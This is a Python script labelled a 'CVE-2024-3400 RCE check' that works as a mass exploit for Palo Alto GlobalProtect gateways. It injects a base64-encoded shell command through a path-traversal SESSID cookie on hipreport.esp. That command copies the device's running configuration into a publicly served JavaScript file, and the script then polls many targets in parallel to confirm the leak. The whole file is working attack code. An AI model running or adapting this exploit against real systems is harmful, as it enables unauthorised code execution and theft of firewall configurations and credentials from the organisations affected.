import argparse
import base64
import random
import requests
import string
import time
import urllib3
from concurrent.futures import ThreadPoolExecutor
from queue import Queue

from rich.console import Console
from rich.style import Style


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


green = Style(color="green")
yellow = Style(color="yellow")
red = Style(color="red")
console = Console(highlight=False)


base_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Content-Type": "application/x-www-form-urlencoded",
}

console = Console()
target_queue = Queue()


def create_random_string(length):
    characters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))


def send_request(url):
#    console.print(f"[yellow][-][/yellow] <{url}>")
    try:
        filename = create_random_string(10)
        cmd = f"tar -czf /var/appweb/sslvpndocs/global-protect/portal/js/jquery.{filename}.js /opt/pancfg/mgmt/saved-configs/running-config.xml"
        base64_cmd = base64.b64encode(cmd.encode()).decode().rstrip("=")
        headers = {
            **base_headers,
            "Cookie": "SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/`echo${IFS}" + base64_cmd + "|base64${IFS}-d|bash${IFS}-i`",
        }
        resp = requests.post(url=f"{url}/ssl-vpn/hipreport.esp", headers=headers, verify=False, allow_redirects=False, timeout=10)
        if resp.status_code == 200:
            target_queue.put(f"{url}/global-protect/portal/js/jquery.{filename}.js\n")
#        else:
#            console.print(f"[red][!][/red] <{url}> {resp.status_code}")
    except Exception as e:
#        console.print(f"[red][!][/red] <{url}> Exception: {str(e)}")
        return False


def check_findings(url):
#    console.print(f"[yellow][-][/yellow] Checking {url}...")
    try:
        resp = requests.get(url=url, headers=base_headers, verify=False, allow_redirects=False, timeout=10)
        if resp.status_code == 200:
            console.print(f"[green][+][/green] Detected RCE: {url}")
            target_queue.put(f"{url}\n")
#        else:
#            console.print(f"[red][!][/red] <{url}> {resp.status_code}")
    except Exception as e:
#        console.print(f"[red][!][/red] <{url}> Exception: {str(e)}")
        return False


def flush_queue(q, q_name):
    with open(f"{q_name}.log",'a') as f:
       while q.qsize():
           f.write(q.get())


def get_targets(filename):
    with open(filename) as f:
        targets = f.readlines()
    return [t.strip() for t in targets]


def main():
    parser = argparse.ArgumentParser(description="CVE-2024-3400 RCE check")
    parser.add_argument("-f", "--file", type=str, help="target urls to check, eg: urls.txt", required=True)
    parser.add_argument("-t", "--threads", type=int, default=100, help="threads to scan", required=False)
    args = parser.parse_args()

    targets = list(set([f"https://{t.replace('http://', '').replace('https://','').strip()}" for t in get_targets(args.file)]))
    console.print(targets[:10])

    console.print(f"[yellow][-][/yellow] Sending {len(targets)} requests...")
    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        pool.map(send_request, targets)

    console.print(f"[green][+][/green] Requests sent. Writing check file...")
    flush_queue(target_queue, "maybe_rce")

    targets = get_targets("maybe_rce.log")

    MAX_RETRIES = 12
    RETRY_INTERVAL = 300
    retries = 0
    while retries <= MAX_RETRIES:
        flush_queue(target_queue, "confirmed_rce")
        targets = list(set(targets) - set(get_targets("confirmed_rce.log")))
        console.print(f"[yellow][-][/yellow] Polling {len(targets)}...")
        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            pool.map(check_findings, targets)
        console.print(f"[yellow][-][/yellow] Sleeping...")
        time.sleep(RETRY_INTERVAL)
        retries += 1

    flush_queue(target_queue, "confirmed_rce")

if __name__ == "__main__":
    main()
